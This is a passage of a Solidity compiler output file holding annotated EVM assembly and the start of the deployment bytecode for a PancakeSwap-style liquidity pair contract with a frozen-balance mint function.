0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1690  balanceOf[to].add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1697  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_381:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1657:1670  balanceOf[to] */\n      dup4\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1657:1666  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1657:1670  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1657:1697  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1712:1743  Transfer(address(0), to, value) */\n      dup4\n      mload\n      dup6\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1657:1670  balanceOf[to] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1712:1743  Transfer(address(0), to, value) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1550:1750  function _mint(address to, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_218:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":192:201  uint256 z */\n      0x00\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":221:222  y */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":217:218  x */\n      dup4\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":217:222  x < y */\n      lt\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":217:230  x < y ? x : y */\n      tag_383\n      jumpi\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":229:230  y */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":217:230  x < y ? x : y */\n      jump(tag_384)\n    tag_383:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":225:226  x */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":217:230  x < y ? x : y */\n    tag_384:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":213:230  z = x < y ? x : y */\n      swap4\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2238:2446  function _burn(address from, uint256 value) internal {... */\n    tag_242:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2334  balanceOf[from] */\n      dup3\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2328  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2334  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2345  balanceOf[from].sub(value) */\n      tag_386\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2339:2344  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2345  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2338  balanceOf[from].sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2345  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_386:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2301:2316  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2301:2310  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2301:2316  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup2\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2301:2345  balanceOf[from] = balanceOf[from].sub(value) */\n      swap2\n      swap1\n      swap2\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2369:2380  totalSupply */\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2369:2391  totalSupply.sub(value) */\n      tag_387\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2385:2390  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2369:2391  totalSupply.sub(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2369:2384  totalSupply.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2369:2391  totalSupply.sub(value) */\n      and\n      jump\t// in\n    tag_387:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2355:2366  totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2355:2391  totalSupply = totalSupply.sub(value) */\n      swap1\n      dup2\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2406:2439  Transfer(from, address(0), value) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      and\n      swap2\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap2\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2238:2446  function _burn(address from, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1756:2232  function freezeMint(... */\n    tag_293:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1849:1853  bool */\n      0x00\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1911:1932  account != address(0) */\n      dup4\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1903:1968  require(account != address(0), \"BEP20: mint to the zero address\") */\n      tag_389\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x42455032303a206d696e7420746f20746865207a65726f206164647265737300\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_389:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2058:2069  totalSupply */\n      sload(0x00)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2058:2081  totalSupply.add(amount) */\n      tag_390\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2074:2080  amount */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2058:2081  totalSupply.add(amount) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2058:2073  totalSupply.add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2058:2081  totalSupply.add(amount) */\n      and\n      jump\t// in\n    tag_390:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2044:2055  totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2044:2081  totalSupply = totalSupply.add(amount) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2140  _frozenBalance[account] */\n      dup5\n      and\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2131  _frozenBalance */\n      0x03\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2140  _frozenBalance[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2152  _frozenBalance[account].add(amount) */\n      tag_391\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2145:2151  amount */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2152  _frozenBalance[account].add(amount) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2144  _frozenBalance[account].add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2152  _frozenBalance[account].add(amount) */\n      and\n      jump\t// in\n    tag_391:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2091:2114  _frozenBalance[account] */\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2091:2105  _frozenBalance */\n      0x03\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2091:2114  _frozenBalance[account] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2091:2152  _frozenBalance[account] = _frozenBalance[account].add(amount) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2167:2204  Transfer(address(0), account, amount) */\n      dup4\n      mload\n      dup7\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2091:2114  _frozenBalance[account] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2167:2204  Transfer(address(0), account, amount) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2221:2225  true */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1756:2232  function freezeMint(... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":319:437  function encode(uint112 y) internal pure returns (uint224 z) {... */\n    tag_340:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":394:404  uint224(y) */\n      and\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":394:411  uint224(y) * Q112 */\n      mul\n      swap1\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":319:437  function encode(uint112 y) internal pure returns (uint224 z) {... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":505:611  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n    tag_341:\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":565:574  uint224 z */\n      0x00\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":594:604  uint224(y) */\n      dup3\n      and\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":590:604  x / uint224(y) */\n      dup5\n      and\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":594:604  uint224(y) */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":590:604  x / uint224(y) */\n      tag_394\n      jumpi\n      invalid\n    tag_394:\n      div\n      swap4\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":505:611  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":198:333  function add(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_348:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":290:295  x + y */\n      dup1\n      dup3\n      add\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":285:301  (z = x + y) >= x */\n      dup3\n      dup2\n      lt\n      iszero\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":277:326  require((z = x + y) >= x, \"ds-math-add-overflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6164642d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    stop\n    data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c 50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54\n    data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e 556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n    data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544\n    data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n    data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8 50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54\n    data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n\n    auxdata: 0xa265627a7a72315820fa4b361cdd6daa0da2a7850e045553687791240905a83c39dd556167998e768b64736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "6080604052600680546001600160a01b03191673358bb1515a41a803ad950d3a0d22b914093ddb801790556001600f5534801561003b57600080fd5b50604051469080605261280f82396040805191829003605201822082820182526007808452664b4243204c507360c81b6020948501528251808401845260018152603160f81b908501528251808501929092527f6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe828401527fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6606083015260808201959095523060a0808301919091528251808303909101815260c090910190915280519101206004555080546001600160a01b031916331790556126ea806101256000396000f3fe608060405234801561001057600080fd5b50600436106101e55760003560e01c806370a082311161010f578063bc25cf77116100a2578063dcbbb37311610071578063dcbbb373146105ff578063dd62ed3e14610625578063f317739c14610653578063fff6cae91461065b576101e5565b8063bc25cf7714610578578063c45a01551461059e578063d21220a7146105a6578063d505accf146105ae576101e5565b8063900820d8116100de578063900820d81461053457806395d89b411461053c578063a9059cbb14610544578063ba9a7a5614610570576101e5565b806370a08231146104a15780637464fc3d146104c75780637ecebe00146104cf57806389afcb44146104f5576101e5565b806323b872dd1161018757806347d5d8561161015657806347d5d856146104455780635909c0d51461046b5780635a3d5493146104735780636a6278421461047b576101e5565b806323b872dd146103e157806330adf81f14610417578063313ce5671461041f5780633644e5151461043d576101e5565b8063095ea7b3116101c3578063095ea7b31461032d5780630dfe16811461036d5780631794bb3c1461039157806318160ddd146103c7576101e5565b8063022c0d9f146101ea57806306fdde03146102785780630902f1ac146102f5575b600080fd5b6102766004803603608081101561020057600080fd5b8135916020810135916001600160a01b03604083013516919081019060808101606082013564010000000081111561023757600080fd5b82018360208201111561024957600080fd5b8035906020019184600183028401116401000000008311171561026b57600080fd5b509092509050610663565b005b610280610c17565b6040805160208082528351818301528351919283929083019185019080838360005b838110156102ba5781810151838201526020016102a2565b50505050905090810190601f1680156102e75780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102fd610c3a565b604080516001600160701b03948516815292909316602083015263ffffffff168183015290519081900360600190f35b6103596004803603604081101561034357600080fd5b506001600160a01b038135169060200135610c64565b604080519115158252519081900360200190f35b610375610c7b565b604080516001600160a01b039092168252519081900360200190f35b610276600480360360608110156103a757600080fd5b506001600160a01b03813581169160208101359091169060400135610c8a565b6103cf610d13565b60408051918252519081900360200190f35b610359600480360360608110156103f757600080fd5b506001600160a01b03813581169160208101359091169060400135610d19565b6103cf610db3565b610427610dd7565b6040805160ff9092168252519081900360200190f35b6103cf610ddc565b6103cf6004803603602081101561045b57600080fd5b50356001600160a01b0316610de2565b6103cf610df4565b6103cf610dfa565b6103cf6004803603602081101561049157600080fd5b50356001600160a01b0316610e00565b6103cf600480360360208110156104b757600080fd5b50356001600160a01b03166110fe565b6103cf611110565b6103cf600480360360208110156104e557600080fd5b50356001600160a01b0316611116565b61051b6004803603602081101561050b57600080fd5b50356001600160a01b0316611128565b6040805192835260208301919091528051918290030190f35b6103756114cc565b6102806114db565b6103596004803603604081101561055a57600080fd5b506001600160a01b0381351690602001356114fd565b6103cf61150a565b6102766004803603602081101561058e57600080fd5b50356001600160a01b0316611510565b610375611679565b610375611688565b610276600480360360e08110156105c457600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135611697565b6103cf6004803603602081101561061557600080fd5b50356001600160a01b0316611897565b6103cf6004803603604081101561063b57600080fd5b506001600160a01b0381358116916020013516611ae6565b6103cf611b03565b610276611b09565b600f546001146106ac576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55841515806106bf5750600084115b6106fa5760405162461bcd60e51b815260040180806020018281038252602381526020018061266d6023913960400191505060405180910390fd5b600080610705610c3a565b5091509150816001600160701b03168710801561072a5750806001600160701b031686105b61077b576040805162461bcd60e51b815260206004820152601f60248201527f50616e63616b653a20494e53554646494349454e545f4c495155494449545900604482015290519081900360640190fd5b60008080606460058b02048a0390506000606460058b02600854600954929091048c0392506001600160a01b03908116918116908b1682148015906107d25750806001600160a01b03168b6001600160a01b031614155b610819576040805162461bcd60e51b815260206004820152601360248201527250616e63616b653a20494e56414c49445f544f60681b604482015290519081900360640190fd5b8c1561082a5761082a828c86611c69565b8b1561083b5761083b818c85611c69565b88156108f6578a6001600160a01b031663848008123386868e8e6040518663ffffffff1660e01b815260040180866001600160a01b03166001600160a01b03168152602001858152602001848152602001806020018281038252848482818152602001925080828437600081840152601f19601f8201169050808301925050509650505050505050600060405180830381600087803b1580156108dd57600080fd5b505af11580156108f1573d6000803e3d6000fd5b505050505b606460058e810282900491908e02048e15610923576006546109239085906001600160a01b031684611c69565b8d15610941576006546109419084906001600160a01b031683611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038616916370a08231916024808301926020929190829003018186803b15801561098757600080fd5b505afa15801561099b573d6000803e3d6000fd5b505050506040513d60208110156109b157600080fd5b5051604080516370a0823160e01b815230600482015290519199506001600160a01b038516916370a0823191602480820192602092909190829003018186803b1580156109fd57600080fd5b505afa158015610a11573d6000803e3d6000fd5b505050506040513d6020811015610a2757600080fd5b505196506000955050505050506001600160701b0385168a90038311610a4e576000610a5d565b89856001600160701b03160383035b9050600089856001600160701b0316038311610a7a576000610a89565b89856001600160701b03160383035b90506000821180610a9a5750600081115b610ad55760405162461bcd60e51b81526004018080602001828103825260228152602001806125dd6022913960400191505060405180910390fd5b6000610b09610aeb84601963ffffffff611e0316565b610afd8761271063ffffffff611e0316565b9063ffffffff611e6616565b90506000610b21610aeb84601963ffffffff611e0316565b9050610b536305f5e100610b476001600160701b038b8116908b1663ffffffff611e0316565b9063ffffffff611e0316565b610b63838363ffffffff611e0316565b1015610ba3576040805162461bcd60e51b815260206004820152600a60248201526950616e63616b653a204b60b01b604482015290519081900360640190fd5b5050610bb184848888611eb6565b60408051838152602081018390528082018d9052606081018c905290516001600160a01b038b169133917fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d8229181900360800190a350506001600f55505050505050505050565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b600b546001600160701b0380821692600160701b830490911691600160e01b900463ffffffff1690565b6000610c71338484612079565b5060015b92915050565b6008546001600160a01b031681565b6007546001600160a01b03163314610cde576040805162461bcd60e51b81526020600482015260126024820152712830b731b0b5b29d102327a92124a22222a760711b604482015290519081900360640190fd5b600880546001600160a01b039485166001600160a01b0319918216179091556009805493909416921691909117909155600a55565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610d9e576001600160a01b0384166000908152600260209081526040808320338452909152902054610d79908363ffffffff611e6616565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b610da98484846120db565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b600c5481565b600d5481565b6000600f54600114610e4b576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580610e5b610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015610eaf57600080fd5b505afa158015610ec3573d6000803e3d6000fd5b505050506040513d6020811015610ed957600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015610f2c57600080fd5b505afa158015610f40573d6000803e3d6000fd5b505050506040513d6020811015610f5657600080fd5b505190506000610f75836001600160701b03871663ffffffff611e6616565b90506000610f92836001600160701b03871663ffffffff611e6616565b90506000610fa08787612183565b60005490915080610fdd57610fc96103e8610afd610fc4878763ffffffff611e0316565b6122f6565b9850610fd860006103e8612348565b61102c565b6110296001600160701b038916610ffa868463ffffffff611e0316565b8161100157fe5b046001600160701b03891661101c868563ffffffff611e0316565b8161102357fe5b046123cc565b98505b6000891161106b5760405162461bcd60e51b81526004018080602001828103825260268152602001806126906026913960400191505060405180910390fd5b6110758a8a612348565b61108186868a8a611eb6565b81156110b157600b546110ad906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b6040805185815260208101859052815133927f4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f928290030190a250506001600f5550949695505050505050565b60016020526000908152604090205481565b600e5481565b60056020526000908152604090205481565b600080600f54600114611174576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580611184610c3a565b50600854600954604080516370a0823160e01b815230600482015290519496509294506001600160a01b039182169391169160009184916370a08231916024808301926020929190829003018186803b1580156111e057600080fd5b505afa1580156111f4573d6000803e3d6000fd5b505050506040513d602081101561120a57600080fd5b5051604080516370a0823160e01b815230600482015290519192506000916001600160a01b038516916370a08231916024808301926020929190829003018186803b15801561125857600080fd5b505afa15801561126c573d6000803e3d6000fd5b505050506040513d602081101561128257600080fd5b5051306000908152600160205260408120549192506112a18888612183565b600054909150806112b8848763ffffffff611e0316565b816112bf57fe5b049a50806112d3848663ffffffff611e0316565b816112da57fe5b04995060008b1180156112ed575060008a115b6113285760405162461bcd60e51b81526004018080602001828103825260268152602001806126276026913960400191505060405180910390fd5b61133230846123e4565b61133d878d8d611c69565b611348868d8c611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038916916370a08231916024808301926020929190829003018186803b15801561138e57600080fd5b505afa1580156113a2573d6000803e3d6000fd5b505050506040513d60208110156113b857600080fd5b5051604080516370a0823160e01b815230600482015290519196506001600160a01b038816916370a0823191602480820192602092909190829003018186803b15801561140457600080fd5b505afa158015611418573d6000803e3d6000fd5b505050506040513d602081101561142e57600080fd5b5051935061143e85858b8b611eb6565b811561146e57600b5461146a906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b604080518c8152602081018c905281516001600160a01b038f169233927fdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496929081900390910190a35050505050505050506001600f81905550915091565b6006546001600160a01b031681565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b6000610c713384846120db565b6103e881565b600f54600114611559576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854600954600b54604080516370a0823160e01b815230600482015290516001600160a01b0394851694909316926116089285928792611603926001600160701b03169185916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b505afa1580156115df573d6000803e3d6000fd5b505050506040513d60208110156115f557600080fd5b50519063ffffffff611e6616565b611c69565b600b54604080516370a0823160e01b8152306004820152905161166f928492879261160392600160701b90046001600160701b0316916001600160a01b038616916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b50506001600f5550565b6007546001600160a01b031681565b6009546001600160a01b031681565b428410156116df576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa1580156117fa573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906118305750886001600160a01b0316816001600160a01b0316145b611881576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b61188c898989612079565b505050505050505050565b6000600f546001146118e2576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f819055806118f2610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b15801561194657600080fd5b505afa15801561195a573d6000803e3d6000fd5b505050506040513d602081101561197057600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b1580156119c357600080fd5b505afa1580156119d7573d6000803e3d6000fd5b505050506040513d60208110156119ed57600080fd5b505190506000611a0c836001600160701b03871663ffffffff611e6616565b90506000611a29836001600160701b03871663ffffffff611e6616565b90506000611a378787612183565b60005490915080611a7057611a5b6103e8610afd610fc4878763ffffffff611e0316565b9850611a6a60006103e8612470565b50611a90565b611a8d6001600160701b038916610ffa868463ffffffff611e0316565b98505b60008911611acf5760405162461bcd60e51b81526004018080602001828103825260288152602001806125ff6028913960400191505060405180910390fd5b611ad98a8a612470565b5061108186868a8a611eb6565b600260209081526000928352604080842090915290825290205481565b600a5481565b600f54600114611b52576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854604080516370a0823160e01b81523060048201529051611c62926001600160a01b0316916370a08231916024808301926020929190829003018186803b158015611ba357600080fd5b505afa158015611bb7573d6000803e3d6000fd5b505050506040513d6020811015611bcd57600080fd5b5051600954604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611c1a57600080fd5b505afa158015611c2e573d6000803e3d6000fd5b505050506040513d6020811015611c4457600080fd5b5051600b546001600160701b0380821691600160701b900416611eb6565b6001600f55565b604080518082018252601981527f7472616e7366657228616464726573732c75696e74323536290000000000000060209182015281516001600160a01b0385811660248301526044808301869052845180840390910181526064909201845291810180516001600160e01b031663a9059cbb60e01b1781529251815160009460609489169392918291908083835b60208310611d165780518252601f199092019160209182019101611cf7565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114611d78576040519150601f19603f3d011682016040523d82523d6000602084013e611d7d565b606091505b5091509150818015611dab575080511580611dab5750808060200190516020811015611da857600080fd5b50515b611dfc576040805162461bcd60e51b815260206004820152601860248201527f50616e63616b653a205452414e534645525f4641494c45440000000000000000604482015290519081900360640190fd5b5050505050565b6000811580611e1e57505080820282828281611e1b57fe5b04145b610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6d756c2d6f766572666c6f7760601b604482015290519081900360640190fd5b80820382811115610c75576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160701b038411801590611ed457506001600160701b038311155b611f19576040805162461bcd60e51b815260206004820152601160248201527050616e63616b653a204f564552464c4f5760781b604482015290519081900360640190fd5b600b5463ffffffff42811691600160e01b90048116820390811615801590611f